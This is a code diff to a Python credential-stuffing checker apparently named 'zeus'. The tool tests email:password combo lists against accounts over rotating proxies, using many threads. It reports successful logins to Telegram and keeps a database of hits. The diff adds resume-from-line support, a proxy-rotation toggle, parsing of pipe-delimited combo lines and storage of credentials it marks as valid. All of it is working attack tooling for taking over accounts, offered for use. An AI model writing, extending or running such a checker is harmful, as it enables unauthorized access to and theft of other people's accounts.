@@ -12,7 +12,14 @@ from zeus.proxy import parse_proxy_lines
 from zeus.telegram_notify import notify_hit
 
 from .combo_store import iter_nonempty_lines
-from .db import FINAL_STATUSES, combo_key, get_checked_keys, insert_hit, mark_combo_checked
+from .db import (
+    FINAL_STATUSES,
+    combo_key,
+    get_checked_keys,
+    insert_hit,
+    insert_valid,
+    mark_combo_checked,
+)
 
 
 @dataclass
@@ -30,6 +37,8 @@ class JobStats:
     stop_requested: bool = False
     current: str = ""
     started_at: float | None = None
+    start_line: int = 1
+    rotate_proxy: bool = True
     logs: list[str] = field(default_factory=list)
     log_seq: int = 0
 
@@ -51,6 +60,8 @@ class CheckerWorker:
         combo_file: Path | None = None,
         proxies: list[str],
         threads: int = 5,
+        start_line: int = 1,
+        rotate_proxy: bool = True,
     ) -> dict[str, Any]:
         with self._lock:
             if self.stats.running or self.stats.preparing:
@@ -61,6 +72,8 @@ class CheckerWorker:
 
             parsed_proxies, invalid_proxies = parse_proxy_lines(proxies)
             prep_logs = ["Preparing combo list..."]
+            if start_line > 1:
+                prep_logs.append(f"Starting from line {start_line:,}")
             if invalid_proxies:
                 prep_logs.append(
                     f"Skipped {len(invalid_proxies)} invalid proxy line(s) — use host:port:user:pass"
@@ -69,12 +82,21 @@ class CheckerWorker:
             self.stats = JobStats(
                 running=True,
                 preparing=True,
+                start_line=max(1, start_line),
+                rotate_proxy=rotate_proxy,
                 logs=prep_logs,
             )
 
         self._thread = threading.Thread(
             target=self._prepare_and_run,
-            args=(combo_lines, combo_file, parsed_proxies, max(1, threads)),
+            args=(
+                combo_lines,
+                combo_file,
+                parsed_proxies,
+                max(1, threads),
+                max(1, start_line),
+                rotate_proxy,
+            ),
             daemon=True,
         )
         self._thread.start()
@@ -94,7 +116,6 @@ class CheckerWorker:
 
             new_logs = []
             if since_log_seq > 0:
-                start_idx = max(0, since_log_seq - (self.stats.log_seq - len(self.stats.logs)))
                 if since_log_seq < self.stats.log_seq:
                     offset = self.stats.log_seq - len(self.stats.logs)
                     idx = max(0, since_log_seq - offset)
@@ -114,6 +135,8 @@ class CheckerWorker:
                 "running": self.stats.running,
                 "preparing": self.stats.preparing,
                 "current": self.stats.current,
+                "start_line": self.stats.start_line,
+                "rotate_proxy": self.stats.rotate_proxy,
                 "log_seq": self.stats.log_seq,
                 "logs": new_logs,
                 "cpm": round(cpm, 1),
@@ -131,11 +154,14 @@ class CheckerWorker:
         self,
         combo_lines: list[str] | None,
         combo_file: Path | None,
+        start_line: int,
     ) -> Iterable[str]:
         if combo_lines is not None:
+            if start_line > 1:
+                return combo_lines[start_line - 1 :]
             return combo_lines
         if combo_file is not None:
-            return iter_nonempty_lines(combo_file)
+            return iter_nonempty_lines(combo_file, start_line=start_line)
         return []
 
     def _prepare_and_run(
@@ -144,14 +170,17 @@ class CheckerWorker:
         combo_file: Path | None,
         proxies: list[str],
         threads: int,
+        start_line: int,
+        rotate_proxy: bool,
     ) -> None:
         try:
             checked_keys = get_checked_keys()
             parsed_combos: list[tuple[str, str]] = []
             seen_keys: set[str] = set()
             raw_count = 0
+            skipped_lines = max(0, start_line - 1)
 
-            for line in self._iter_combo_lines(combo_lines, combo_file):
+            for line in self._iter_combo_lines(combo_lines, combo_file, start_line):
                 with self._lock:
                     if self.stats.stop_requested:
                         return
@@ -160,7 +189,8 @@ class CheckerWorker:
                 if raw_count % 10000 == 0:
                     self._log(f"Parsed {raw_count:,} lines...")
 
-                parsed = parse_combo(line)
+                # Support VS-style lines with extra fields after |
+                parsed = parse_combo(line.split("|", 1)[0])
                 if not parsed:
                     continue
                 email, password = parsed
@@ -180,11 +210,13 @@ class CheckerWorker:
                     to_run.append((email, password))
 
             with self._lock:
-                self.stats.total = len(parsed_combos)
+                self.stats.total = len(parsed_combos) + skipped_lines
                 self.stats.queued = len(to_run)
                 self.stats.skipped = skipped
                 self.stats.preparing = False
 
+            if skipped_lines:
+                self._log(f"Skipped first {skipped_lines:,} line(s) (start line {start_line:,})")
             if skipped:
                 self._log(f"Resuming — skipped {skipped:,} already-checked combo(s)")
 
@@ -203,8 +235,12 @@ class CheckerWorker:
             with self._lock:
                 self.stats.started_at = time.time()
 
-            self._log(f"Starting — {len(to_run):,} combo(s) queued · {threads} threads")
-            self._run(to_run, proxies, threads)
+            rotate_label = "on" if rotate_proxy else "off"
+            self._log(
+                f"Starting — {len(to_run):,} combo(s) queued · {threads} threads · "
+                f"proxy rotate {rotate_label}"
+            )
+            self._run(to_run, proxies, threads, rotate_proxy)
         except Exception as exc:
             with self._lock:
                 self.stats.preparing = False
@@ -235,13 +271,15 @@ class CheckerWorker:
             notify_hit(result)
             if hit_id is None:
                 self._log(f"DUPLICATE HIT | {email}")
+        elif result.status == "FAIL":
+            line = result.format_line()
+            insert_valid(line, email, password, result.to_data())
+            with self._lock:
+                self.stats.fails += 1
+            self._log(line)
         elif result.status == "BAD":
             with self._lock:
                 self.stats.bads += 1
-            self._log(result.format_line())
-        elif result.status == "FAIL":
-            with self._lock:
-                self.stats.fails += 1
             self._log(result.format_line())
         else:
             with self._lock:
@@ -253,6 +291,7 @@ class CheckerWorker:
         combos: list[tuple[str, str]],
         proxies: list[str],
         threads: int,
+        rotate_proxy: bool,
     ) -> None:
         from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
 
@@ -267,7 +306,13 @@ class CheckerWorker:
                 self.stats.current = email
 
             proxy = self._pick_proxy(proxies, idx) if proxies else _UNSET
-            return check_account(email, password, proxy=proxy, timeout=45)
+            return check_account(
+                email,
+                password,
+                proxy=proxy,
+                rotate_proxy=rotate_proxy,
+                timeout=45,
+            )
 
         def submit_next(pool) -> bool:
             with self._lock:
